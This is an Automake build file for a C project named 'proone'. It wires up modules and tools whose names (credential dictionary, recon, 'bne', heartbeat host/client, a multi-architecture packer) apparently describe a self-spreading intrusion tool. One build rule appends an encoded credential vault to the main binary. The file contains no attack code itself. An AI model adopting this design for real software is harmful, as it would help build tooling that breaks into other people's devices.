AM_CFLAGS =\
	-std=c11\
	-pedantic\
	-Wall\
	-Wextra\
	-Wno-switch\
	-D_POSIX_C_SOURCE=200112L\
	-Wno-unused-parameter\
	-Werror=implicit-function-declaration\
	-fdata-sections\
	-ffunction-sections\
	-Wl,--gc-sections

AM_LDFLAGS =

if DEBUG
AM_CFLAGS += -g -O0
else
AM_CFLAGS += -g -Os
endif
if STATIC_RT
AM_LDFLAGS += -static
endif

# Override AM's default to remove "-I." flag
DEFAULT_INCLUDES =

noinst_LIBRARIES = libproone.a
my_DATA = proone testlist
mydir = $(bindir)

bin_PROGRAMS =\
	proone.bin\
	proone-mkdvault\
	proone-pack\
	proone-list-arch\
	proone-resolv\
	proone-stress\
	proone-ipaddr-arr\
	proone-htbthost\
	proone-rnd\
	proone-recon\
	proone-mkcdict\
	proone-bne
if BUILD_MTTOOLS
bin_PROGRAMS +=\
	proone-htbtclient\
	proone-hostinfod\
	proone-yamlls
endif

proone_tests =\
	proone-test_proto\
	proone-test_util\
	proone-test_iobuf\
	proone-test_bitfield
bin_PROGRAMS += $(proone_tests)

libproone_a_SOURCES =\
	protocol.c\
	pack.c\
	dvault.c\
	util_rt.c\
	llist.c\
	iset.c\
	imap.c\
	mbedtls.c\
	pth.c\
	resolv.c\
	htbt.c\
	iobuf.c\
	rnd.c\
	rnd_well512.c\
	recon.c\
	inet.c\
	libssh2.c\
	strmap.c\
	cred_dict.c\
	bne.c\
	bitfield.c
if BUILD_MTTOOLS
libproone_a_SOURCES += yaml.c
endif

proone: proone.bin dvault.bin
	cp -fa proone.bin proone
	./build-utils.sh align-file @BIN_ALIGNMENT@ proone
	./build-utils.sh append-uint16 `stat -c "%s" dvault.bin` proone
	./build-utils.sh append-uint16 0 proone
	./build-utils.sh append-uint32 0 proone
	cat dvault.bin >> proone

proone_bin_LDADD = libproone.a
proone_bin_SOURCES =\
	proone.c

dvault.bin: proone-mkdvault cred_dict.bin
	./proone-mkdvault cred_dict.bin > dvault.bin

cred_dict.bin: proone-mkcdict proone_conf/cred_dict.txt
	./proone-mkcdict proone_conf/cred_dict.txt cred_dict.bin

proone_mkdvault_LDADD = libproone.a
proone_mkdvault_SOURCES = proone-mkdvault.c

proone_pack_LDADD = libproone.a
proone_pack_SOURCES = proone-pack.c

proone_list_arch_LDADD = libproone.a
proone_list_arch_SOURCES = proone-list-arch.c

proone_resolv_LDADD = libproone.a
proone_resolv_SOURCES = proone-resolv.c

proone_htbthost_LDADD = libproone.a
proone_htbthost_SOURCES = proone-htbthost.c

proone_ipaddr_arr_SOURCES = proone-ipaddr-arr.c

proone_stress_LDADD = libproone.a
proone_stress_SOURCES = proone-stress.c

proone_rnd_LDADD = libproone.a
proone_rnd_SOURCES = proone-rnd.c

proone_mkcdict_LDADD = libproone.a
proone_mkcdict_SOURCES = proone-mkcdict.c

proone_bne_LDADD = libproone.a
proone_bne_SOURCES = proone-bne.c

proone_recon_LDADD = libproone.a
proone_recon_SOURCES = proone-recon.c

if BUILD_MTTOOLS
proone_hostinfod_LDADD = libproone.a
proone_hostinfod_SOURCES = proone-hostinfod.c
proone_htbtclient_LDADD = libproone.a
proone_htbtclient_SOURCES = proone-htbtclient.c
proone_yamlls_LDADD = libproone.a
proone_yamlls_SOURCES = proone-yamlls.c
endif

proone_test_proto_LDADD = libproone.a
proone_test_proto_SOURCES = proone-test_proto.c

proone_test_util_LDADD = libproone.a
proone_test_util_SOURCES = proone-test_util.c

proone_test_iobuf_LDADD = libproone.a
proone_test_iobuf_SOURCES = proone-test_iobuf.c

proone_test_bitfield_LDADD = libproone.a
proone_test_bitfield_SOURCES = proone-test_bitfield.c

testlist: $(proone_tests)
	echo $(proone_tests) > testlist
